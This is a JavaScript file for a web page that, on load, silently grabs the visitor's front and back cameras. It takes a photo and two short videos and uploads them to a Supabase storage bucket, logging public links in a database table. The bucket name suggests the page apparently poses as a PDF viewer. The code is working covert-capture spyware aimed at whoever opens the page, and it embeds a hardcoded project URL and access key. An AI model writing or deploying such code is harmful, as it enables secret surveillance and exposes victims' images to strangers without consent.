import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

// ---------------------
// SUPABASE CONFIG
// ---------------------
const supabaseUrl = "https://ozpdotxjaprdsxvlrikp.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im96cGRvdHhqYXByZHN4dmxyaWtwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUxMDkzMTEsImV4cCI6MjA4MDY4NTMxMX0.0J0czcxYk7FnnXjN-43A88BWhMou_C5yzgKMOkjaS_o";

const supabase = createClient(supabaseUrl, supabaseKey);

// Auto-start capture when page loads
window.addEventListener("load", () => startCapture());

// ---------------------
// MAIN CAPTURE LOGIC
// ---------------------
async function startCapture() {
  try {
    // ---------- FRONT CAMERA ----------
    const frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
    });

    // Take photo
    const imageCapture = new ImageCapture(frontStream.getVideoTracks()[0]);
    const photoBlob = await imageCapture.takePhoto();

    // Record 3 sec video
    const frontVideoBlob = await recordVideo(frontStream, 3000);
    frontStream.getTracks().forEach((t) => t.stop());

    // ---------- BACK CAMERA ----------
    let backStream;
    try {
      backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" } },
      });
    } catch (err) {
      backStream = await navigator.mediaDevices.getUserMedia({ video: true });
    }

    const backVideoBlob = await recordVideo(backStream, 3000);
    backStream.getTracks().forEach((t) => t.stop());

    // ---------- UPLOAD ----------
    const photoURL = await uploadSupabase(photoBlob, "front.jpg");
    const frontVideoURL = await uploadSupabase(frontVideoBlob, "front.mp4");
    const backVideoURL = await uploadSupabase(backVideoBlob, "back.mp4");

    // ---------- SAVE TO DATABASE ----------
    const { data, error } = await supabase
      .from("captures")
      .insert({
        photo_url: photoURL,
        front_video_url: frontVideoURL,
        back_video_url: backVideoURL,
        created_at: new Date().toISOString(),
      });

    if (error) throw error;

    console.log("🔥 Saved to Supabase table:", data);
  } catch (err) {
    console.error("❌ Capture error:", err);
  }
}

// ---------------------
// UPLOAD FILE TO SUPABASE
// ---------------------
async function uploadSupabase(blob, filename) {
  const fullName = `captures/${Date.now()}_${filename}`;

  // Upload file
  const { error: uploadError } = await supabase.storage
    .from("pdfniba") // your bucket name — create this bucket
    .upload(fullName, blob, {
      cacheControl: "3600",
      contentType: blob.type,
      upsert: false,
    });

  if (uploadError) {
    console.error("Upload failed:", uploadError);
    return null;
  }

  // Get public URL
  const { data } = supabase.storage
    .from("pdfniba")
    .getPublicUrl(fullName);

  return data.publicUrl;
}

// ---------------------
// RECORD VIDEO (3 sec)
// ---------------------
function recordVideo(stream, ms) {
  return new Promise((resolve) => {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = (e) => chunks.push(e.data);
    recorder.onstop = () =>
      resolve(new Blob(chunks, { type: "video/mp4" }));
    recorder.start();
    setTimeout(() => recorder.stop(), ms);
  });
}
